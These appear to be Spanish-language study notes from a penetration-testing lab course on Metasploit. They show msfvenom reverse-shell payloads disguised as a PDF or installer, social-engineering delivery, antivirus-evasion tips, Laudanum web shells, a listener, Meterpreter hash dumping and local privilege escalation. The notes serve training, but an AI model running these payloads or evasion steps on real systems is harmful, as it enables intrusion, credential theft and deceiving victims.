> Metasploit es un framework de código abierto para pruebas de penetración creado por Rapid7, diseñado para ayudar a los profesionales de la seguridad a simular ataques contra sistemas informáticos, redes y aplicaciones. Proporciona un conjunto completo de herramientas y módulos que pueden usarse para identificar vulnerabilidades, explotarlas y evaluar la seguridad de los sistemas objetivo. Metasploit está escrito en Ruby y ofrece una arquitectura modular, lo que permite a los usuarios personalizar y ampliar sus capacidades.

A continuación, se proporciona un cheatsheet de la herramienta. No se menciona en dicho cheatsheet, pero cuando estemos trabajando con la herramienta, conocemos que `set` establece información, como `RHOSTS`, `RPORT`... pero esto se hace para el módulo en el que estemos. Si cambiamos de módulo, tendremos que reconfigurar la información. Sin embargo, si ponemos `setg {...}` se establecerá la información durante toda la sesión. Es decir:

```bash
# Para el módulo en concreto
set RHOSTS 192.168.1.13
set RPORT 445
# Para la sesión
setg RHOSTS 192.168.1.13
setg RPORT 445
```

![[Pasted image 20250412213121.png]]

### MSFVenom

Debemos tener en cuenta que usar ataques automatizados con Metasploit requiere acceso a la máquina vulnerable a través de la red. Para ejecutar un exploit, enviar el payload y obtener una shell, primero necesitamos comunicarnos con el sistema. Esto suele ser posible si estamos en la misma red o tenemos una ruta hacia ella. Sin embargo, a veces no tendremos acceso directo a la red del objetivo. En esos casos, tendremos que ingeniárnoslas para que el payload sea entregado y ejecutado, por ejemplo, usando **MSFvenom** para crear un payload que se pueda enviar por correo electrónico o mediante técnicas de ingeniería social.

En resumen, **Msfvenom** es una herramienta para crear payloads efectivos

##### Practicando con la herramienta

Con el comando `msfvenom -l` podemos listar los payloads disponibles. Podemos ver que siempre comienzan con el sistema operativo para el que trabaja el payload, además del tipo de payload que es (Stage o Stageless). Existen diferencias entre ellos:

**Payloads Staged**

Los **payloads escalonados (staged payloads)** permiten enviar nuestra carga útil en partes, como si estuviéramos “preparando el escenario” para algo más avanzado. Por ejemplo, el payload `linux/x86/shell/reverse_tcp` primero envía una pequeña parte (el _stager_) que se ejecuta en el sistema objetivo y luego se conecta de vuelta a la máquina atacante para descargar el resto del código (el _stage_) y así establecer una shell reversa.

Si usamos Metasploit para ejecutar este tipo de payload, debemos configurar correctamente la IP y el puerto del atacante para que el _listener_ (escucha) pueda capturar la conexión. Es importante tener en cuenta que cada etapa ocupa espacio en memoria, lo que puede limitar el tamaño del payload. Además, el comportamiento puede variar según el payload específico que se utilice.

**Payloads Stageless**

Los **payloads sin etapas (stageless)** se envían completos, sin necesidad de una fase previa que prepare el entorno. Por ejemplo, el payload `linux/zarch/meterpreter_reverse_tcp` se transmite de una sola vez mediante un módulo de explotación en Metasploit.

Esto es útil en entornos con poco ancho de banda o alta latencia, donde los payloads escalonados podrían causar sesiones inestables. Además, los stageless pueden ser más eficaces para evadir detección, ya que generan menos tráfico en la red, especialmente si se entregan mediante técnicas de ingeniería social.

##### Construyendo un payload stageless

Por ejemplo, vamos a constuir un payload stageless haciendo uso de una reverse shell en Linux x64, es decir, basándonos en dicha arquitectura. Hemos escogido `linux/x64/shell_reverse_tcp` (lo podemos obtener listando los payloads disponibles). 

```shell-session
amr251@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Es bastante intuitivo, pero aun así, vamos a explicar los flags:
- `LHOST=10.10.14.113 LPORT=443`: Al ejecutarse, se conectará al host y puerto especificados
- `-f elf`: El formato en el que se generará el payload
- `> createbackup.elf`: El output

##### Ejecutando un payload stageless

En este punto, hemos creado el payload en nuestra máquina de atacante, pero hay que enviárselo a la máquina víctima de alguna manera. Hay muchas formas de hacer esto:

- Enviarlo como **archivo adjunto por email**.
- Colocarlo en un **enlace de descarga** en un sitio web.
- Usarlo junto con un **módulo de explotación de Metasploit** (si ya estamos dentro de la red interna).
- Cargarlo en una **unidad USB** durante un pentest físico.

Una vez que el archivo está en la máquina, también será necesario **ejecutarlo**. Por ejemplo: si el equipo objetivo es una máquina Ubuntu que un administrador usa para tareas de red, como acceder a routers o switches, y además lo utiliza de forma descuidada como si fuera un PC personal, podríamos engañarlo para que haga clic en el archivo que le enviamos por correo.

##### Creando un payload stageless para Windows

```shell-session
amr251@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

La modificación está en que al ser para Windows, el payload debe ser para la extensión `.exe`. Necesitamos ser creativos, ya que muy seguramente el sistema antivirus detecte el .exe como un virus y lo borre. Si AV está dehabilitado se podría ejecutar en la máquina víctima y sencillamente tendríamos la reverse shell hecha.

## Laudanum

Laudanum es un repositorio de archivos listos para ser utilizados para inyectar en una víctima y recibir acceso de vuelta a través de un shell inverso, ejecutar comandos en el host de la víctima directamente desde el navegador, y mucho más. El repositorio incluye archivos inyectables para muchos lenguajes de aplicaciones web diferentes, incluyendo asp, aspx, jsp, php y más.

Los archivos pueden encontrarse en `/usr/share/laudanum`. Ahora que entendemos qué es Laudanum y cómo funciona, echemos un vistazo a una aplicación web que hemos encontrado en nuestro entorno de laboratorio y veamos si podemos ejecutar una shell web. Si desea seguir con esta demostración, tendrá que añadir una entrada en su archivo /etc/hosts en su máquina virtual de ataque o dentro de Pwnbox para el host que estamos atacando. Esa entrada debe decir: `<ip objetivo> status.inlanefreight.local`

```shell-session
amr251@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Añade tu dirección IP a la variable allowedIps en la línea 59. Puede ser prudente eliminar el arte ASCII y los comentarios del archivo. Estos elementos en un payload son a menudo firmados y pueden alertar a los defensores/AV de lo que estás haciendo.

![[Pasted image 20250413222241.png]]

Ahora tendremos que buscar la forma de subir el archivo. Una vez lo hemos logrado, podremos usar la shell de Laudanum para usar comandos en el host. Otra herramienta que está muy bien para esto es la Antak de Nishang. 

### Targets

Los objetivos son identificadores únicos del sistema operativo tomados de las versiones de esos sistemas operativos específicos que adaptan el módulo de explotación seleccionado para ejecutarse en esa versión concreta del sistema operativo. El comando `show targets` emitido dentro de una vista de módulo de exploit mostrará todos los objetivos vulnerables disponibles para ese exploit específico, mientras que la emisión del mismo comando en el menú raíz, fuera de cualquier módulo de exploit seleccionado, nos hará saber que necesitamos seleccionar primero un módulo de exploit.

```shell-session
msf6 > show targets

[-] No exploit module selected.
```

Vamos a tomar como ejemplo un sistema Windows Server 2016 vulnerable a `Eternal Blue` en el puerto 445 (SMB). 

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
##### Seleccionando un target

Podemos ver que sólo hay un tipo general de objetivo establecido para este tipo de exploit. ¿Y si cambiamos el módulo del exploit por algo que necesite rangos de objetivos más específicos? El siguiente exploit está dirigido a `MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability`

Si queremos obtener más información sobre este módulo específico y lo que hace la vulnerabilidad que hay detrás, podemos utilizar el comando `info`.  

```shell-session
Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7
```

Vemos opciones para diferentes versiones de Internet Explorer y varias versiones de Windows. Dejando la selección en Automático le permitirá a msfconsole saber que necesita realizar la detección de servicios en el objetivo dado antes de lanzar un ataque exitoso.

Sin embargo, si sabemos qué versiones se están ejecutando en nuestro objetivo, podemos utilizar el comando `set target <index number>` para elegir un objetivo de la lista.

### Payloads

Un Payload en Metasploit se refiere a un módulo que ayuda al módulo exploit en (típicamente) devolver un shell al atacante. Las cargas útiles se envían junto con el propio exploit para eludir los procedimientos de funcionamiento estándar del servicio vulnerable (trabajo del exploit) y luego se ejecutan en el SO objetivo para devolver típicamente una conexión inversa al atacante y establecer un punto de apoyo (trabajo del payload).

Existen tres tipos diferentes de módulos de carga útil en Metasploit Framework: Singles, Stagers y Stages. Utilizar tres tipologías de interacción de carga útil resultará beneficioso para el pentester. Puede ofrecer la flexibilidad que necesitamos para realizar ciertos tipos de tareas. El hecho de que una carga útil esté o no por etapas se representa con / en el nombre de la carga útil.

Por ejemplo, `windows/shell_bind_tcp` es una sola carga útil sin etapa, mientras que windows/shell/bind_tcp consiste en un stager (bind_tcp) y una etapa (shell).

##### Single

Contiene el exploit y el shellcode completo para la tarea seleccionada. Algunos exploits no soportarán el tamaño resultante de estas cargas útiles, ya que pueden llegar a ser bastante grandes. Los singles son cargas útiles autocontenidas. Son el único objeto enviado y ejecutado en el sistema objetivo, obteniendo un resultado inmediatamente después de ejecutarse. Un payload Single puede ser tan simple como añadir un usuario al sistema objetivo o arrancar un proceso.

##### Stagers

Los payload Stager trabajan con los payload Stage para realizar una tarea específica. Un Stager está esperando en la máquina del atacante, listo para establecer una conexión con el host víctima una vez que la etapa completa su ejecución en el host remoto. Los Stager se utilizan normalmente para establecer una conexión de red entre el atacante y la víctima y están diseñados para ser pequeños y fiables. Metasploit utilizará el mejor y recurrirá a uno menos preferido cuando sea necesario.

Windows NX vs. NO-NX Stagers

- Problema de fiabilidad para CPUs NX y DEP
- Los stagers NX son más grandes (VirtualAlloc memory)
- Por defecto ahora es compatible NX + Win7

##### Etapas 

Son componentes de payload descargados por módulos de Stagers. Estos payload proporcionan características avanzadas sin límites de espacio, como meterpreter, inyección VNC, etc. Normalmente usan stagers intermedios.

- Un solo `recv()` falla con payloads más grandes
- El Stager recibe el stager intermedio
- El stager intermedio realiza una descarga completa
- Mejor para RWX

### Payload en etapas

Un _staged payload_ divide el proceso de explotación en varias etapas para hacerlo más flexible y evadir mejor los sistemas de defensa. La primera etapa (Stage0) solo busca crear una conexión de vuelta al atacante. Si todas las etapas se ejecutan bien, el atacante logra acceso remoto. Estos payloads se conocen en Metasploit como `reverse_tcp`, `reverse_https`, etc. Las conexiones inversas (_reverse connections_) tienen menos probabilidades de activar sistemas de prevención, ya que quien inicia la conexión es el host víctima, que suele estar dentro de lo que se conoce como una zona de confianza de seguridad. Sin embargo, esta política de confianza no siempre es seguida ciegamente por los dispositivos o el personal de seguridad, por lo que el atacante debe actuar con precaución incluso en esta etapa.

El código de la etapa 0 (_Stage0_) también tiene como objetivo leer en memoria un payload más grande una vez que llega. Tras establecerse un canal de comunicación estable entre el atacante y la víctima, lo más probable es que la máquina atacante envíe una etapa más grande del payload, conocida como _Stage1_, la cual otorga acceso a una shell.

### Encoders

Los `encoders` permiten cambiar el payload para cambiar el sistema operativo y arquitecturas, entre las que se encuentran `x64`,`x86`,`sparc`,`ppc`,`mips`. Antes se usaban codificadores como **Shikata Ga Nai** para evadir antivirus y eliminar caracteres no permitidos en los payloads. Pero hoy en día ya **no son tan efectivos**, porque los sistemas de detección han mejorado. Ahora se buscan **nuevas formas** más modernas para evadir protección.

##### Seleccionando un encoder

Antes se usaban los comandos `msfpayload` y `msfencode` (ya obsoletos) para crear y codificar un payload adaptado a la arquitectura del sistema objetivo, usando un **pipe** para encadenarlos.

> ✅ Hoy en día, todo esto se ha unificado en `msfvenom`, que hace ambas cosas: genera y codifica payloads en un solo paso.

##### Generando un payload - sin codificación

```shell-session
[!bash!]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

<SNIP>
```

##### Generando un payload - con codificación

```shell-session
[!bash!]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

<SNIP>
```

Supongamos que queremos seleccionar un **codificador (Encoder)** para un payload ya existente. Entonces, podemos usar el comando `show encoders` dentro de **msfconsole** para ver qué codificadores están disponibles para la combinación actual de **módulo de exploit** + **payload**.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

En este ejemplo, solo vemos unos pocos de encoders para sistemas x64. Como los payloads disponibles, estos se filtran de forma automática de acuerdo con el módulo para mostrar los compatibles. 

##### MSF - VirusTotal

Una vez hemos creado el payload, podemos pasarle lo siguiente para comprobar qué antivirus lo detectaría y cuáles no.

```shell-session
[!bash!]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
...
```

### Bases de datos

```shell-session
msf6 > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
	

msf6 > db_status

[*] Connected to msf. Connection type: postgresql.
```

### Usando workspaces

Podemos segregar los diferentes resultados de escaneos, hosts e información extraída por IP, subnet, red o dominio en workspaces. Para ver los workspaces disponibles, basta con escribir `workspace` dentro de `msfconsole`. Podemos añadir los flags `-a` y `-d` para añadir o eliminar respectivamente los workspaces. Por defecto, se establece como `default`. 

A continuación, supongamos que queremos importar un escaneo de Nmap de un host a nuestro **Workspace de base de datos** para entender mejor al objetivo. Podemos usar el comando `db_import` para esto. Una vez completada la importación, podemos comprobar la presencia de la información del host en nuestra base de datos usando los comandos `hosts` y `services`. Ten en cuenta que se prefiere el tipo de archivo **.xml** para `db_import`.

```shell-session
$ cat Target.nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
Host is up (0.017s latency).
Not shown: 991 closed ports
...SNIP...
```

```shell-session
msf6 > db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml
..SNIP...
```

Alternativamente podemos usar nmap desde msfconsole. Para ello:

```shell-session
msf6 > db_nmap -sV -sS 10.10.10.8

...


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8              Unknown                    device         
10.10.10.40             Unknown                    device         

...

msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

También podemos exportar la sesión con `db_export`

```shell-session
msf6 > db_export -h

Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified

msf6 > db_export -f xml backup.xml
```

### Hosts

El comando `hosts` muestra una tabla de base de datos que se completa automáticamente con direcciones de hosts, nombres y otra información que se descubre durante los escaneos o interacciones. Por ejemplo, si `msfconsole` está vinculado a plugins de escaneo que detectan servicios y sistemas operativos, esta información aparecerá automáticamente una vez completados los escaneos. Herramientas como **Nessus**, **Nexpose** o **Nmap** son útiles para esto.

### Services

El comando `services` funciona de la misma manera que el anterior (`hosts`). Contiene una tabla con descripciones e información sobre los servicios descubiertos durante los escaneos o interacciones. Al igual que con el comando anterior, las entradas en esta tabla son altamente personalizables.

### Plugins

Los plugins en Metasploit permiten integrar herramientas externas, automatizar tareas y extender funcionalidades, facilitando el trabajo del pentester y centralizando todo dentro de `msfconsole`. Veamos por ejemplo el plugin de Nessus:

```shell-session
msf6 > load nessus

[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus
```

También es posible instalar nuevos plugins. Para instalar plugins personalizados que no estén incluidos en las actualizaciones del sistema, se puede tomar el archivo `.rb` (Ruby) proporcionado por el autor del plugin y colocarlo en la carpeta:  `/usr/share/metasploit-framework/plugins`. Por ejemplo, echemos un vistazo a los plugins de [DarkOperator](https://github.com/darkoperator/Metasploit-Plugins.git).

```shell-session
amr251@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
amr251@htb[/htb]$ ls Metasploit-Plugins

aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb

--- Copiando los plugins a MSF ---

sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

Finalmente, para cargarlos, basta con usar `load`:
 
```shell-session
amr251@htb[/htb]$ msfconsole -q

msf6 > load pentest
```

Podemos añadir módulos adicionales en tiempo de ejecución:

```shell-session
amr251@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
amr251@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```

```shell-session
msf6> loadpath /usr/share/metasploit-framework/modules/
```

O alternativamente, usar el comando `reload_all`. 
### Sesiones

Al ejecutar cualquier exploit o módulo auxiliar disponible en `msfconsole`, podemos enviar la sesión al segundo plano, siempre que se haya establecido un canal de comunicación con el host objetivo. Esto se puede hacer de dos formas:

- Presionando la combinación de teclas **[CTRL] + [Z]**
- Escribiendo el comando **`background`**, en el caso de que estemos usando sesiones de **Meterpreter**.

Esto mostrará un mensaje de confirmación. Después de aceptarlo, volveremos al prompt de `msfconsole` (`msf6 >`) y podremos lanzar un módulo diferente de inmediato.

Podemos usar el comando `sessions` para ver nuestras sesiones activas. Si queremos interactuar con una sesión en específico:

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

Puedes usar módulos de post-explotación en Metasploit sobre una sesión activa al ponerla en segundo plano y luego seleccionar esa sesión en un nuevo módulo. Estos módulos permiten acciones como recolectar credenciales, sugerir exploits locales o escanear redes internas. 

## Meterpreter

##### Payload Meterpreter

El payload _Meterpreter_ es un tipo específico de payload avanzado que utiliza inyección de DLL para mantener una conexión estable con el host víctima, difícil de detectar con controles simples, y persistente incluso tras reinicios o cambios del sistema. Meterpreter opera completamente en memoria y no deja rastros en el disco duro, lo que lo hace muy difícil de detectar mediante técnicas forenses convencionales. Además, permite cargar y descargar scripts o plugins dinámicamente según se necesite.

Una vez que se ejecuta el payload Meterpreter, se crea una nueva sesión que lanza la interfaz de Meterpreter. Esta es muy similar a la de `msfconsole`, pero todos los comandos disponibles están dirigidos al sistema objetivo, el cual ha sido “infectado”. Ofrece una amplia gama de comandos útiles: captura de teclas, obtención de hashes de contraseñas, activación de micrófono, capturas de pantalla, e incluso suplantación de tokens de seguridad de procesos.

Si buscamos los comandos de la herramienta con el comando `help`, vemos que tenemos muchos. La idea principal que debemos entender sobre **Meterpreter** es que es tan bueno como obtener una shell directa en el sistema operativo objetivo, pero con **mayor funcionalidad**.  
Los desarrolladores de Meterpreter establecieron objetivos de diseño claros para que el proyecto destacara en usabilidad en el futuro. Meterpreter necesita ser:

- **Sigiloso (Stealthy)**
- **Potente (Powerful)**
- **Extensible (Extensible)**

Meterpreter permite dumpear hashes con el comando `hashdump`:

```shell-session
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

RID  : 000003eb (1003)
User : IUSR_GRANPA
  Hash LM  : a274b4532c9ca5cdf684351fab962e86
  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88

RID  : 000003ec (1004)
User : IWAM_GRANPA
  Hash LM  : 95d112c4da2348b599183ac6b1d67840
  Hash NTLM: a97f39734c21b3f6155ded7821d04d16

RID  : 000003ef (1007)
User : ASPNET
  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b
  Hash NTLM: edc0d5506804653f58964a2376bbd769

RID  : 000003f1 (1009)
User : Lakis
  Hash LM  : f927b0679b3cc0e192410d9b0b40873c
  Hash NTLM: 3064b6fc432033870c6730228af7867c
```

## MSFVenom

Supongamos que encontramos un puerto FTP abierto que tenía credenciales débiles o permitía el inicio de sesión anónimo por accidente. Ahora, supongamos que ese servidor FTP está vinculado a un servicio web que corre en el puerto TCP/80 de la misma máquina, y que todos los archivos en el directorio raíz del FTP pueden verse en el directorio `/uploads` del servicio web.

También supongamos que el servicio web no tiene ningún tipo de verificación sobre qué archivos se pueden ejecutar desde el lado del cliente. Si se nos permite ejecutar cualquier cosa desde ese servicio web, podríamos subir una **web shell en PHP** a través del FTP y luego acceder a ella desde el navegador. Esto ejecutaría el payload y nos permitiría recibir una **conexión inversa TCP** desde la máquina víctima.

Imaginemos entonces que hemos escaneado el host y tiene el puerto 22 abierto y permite el acceso como anónimo. 

```shell-session
ftp> ls

200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Como vemos que existe el archivo `aspnet_client`, sabemos que podrá ejecutar `.aspx` reverse shells. Podemos hacerlo con msfvenom:

```shell-session
amr251@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

Ahora solo necesitamos navegar a `http://10.10.10.5/reverse_shell.aspx`, y eso activará el payload `.aspx`.  
Sin embargo, **antes de hacer eso**, deberíamos iniciar un **listener en `msfconsole`** para que la solicitud de conexión inversa sea capturada por este.

```shell-session
amr251@htb[/htb]$ msfconsole -q 

msf6 > use multi/handler
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.14.5

LHOST => 10.10.14.5


msf6 exploit(multi/handler) > set LPORT 1337

LPORT => 1337


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337 
```

### Sugerencia - Local Exploit

Como consejo, hay un módulo llamado **Local Exploit Suggester**. Vamos a usar este módulo en este ejemplo, ya que el shell de Meterpreter se ha iniciado con el usuario **IIS APPPOOL\Web**, el cual naturalmente no tiene muchos permisos.  
Además, al ejecutar el comando `sysinfo` vemos que el sistema tiene una arquitectura de **32 bits (x86)**, lo que nos da aún más motivos para confiar en el **Local Exploit Suggester**.

```shell-session
msf6 > search local exploit suggester

<...SNIP...>
   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure

<SNIP>

msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set session 2

session => 2


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Teniendo estos resultados frente a nosotros, podemos fácilmente elegir uno para probarlo. Si el que escogimos no funciona, simplemente pasamos al siguiente. No todas las verificaciones son 100% precisas y no todas las variables son iguales.  
Por ejemplo, el exploit `bypassauc_eventvwr` falla porque el usuario de IIS no pertenece al grupo de administradores, lo cual es lo esperado por defecto. Sin embargo, la segunda opción, `ms10_015_kitrap0d`, sí funciona.

```shell-session
msf6 exploit(multi/handler) > search kitrap0d

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D


msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

